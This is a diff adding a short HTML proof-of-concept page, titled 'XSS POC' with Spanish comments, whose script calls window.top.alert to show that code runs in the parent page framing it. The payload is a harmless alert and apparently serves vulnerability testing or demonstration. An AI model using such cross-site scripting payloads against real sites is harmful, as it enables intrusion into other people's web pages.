@@ -1,0 +1,14 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+    <title>XSS POC</title>
+    <script>
+        // Ejecuta alert en la página padre (donde está el iframe)
+        window.top.alert("XSS Exploit Funciona!");
+    </script>
+</head>
+<body>
+    <h1>Página de prueba XSS</h1>
+</body>
+</html>
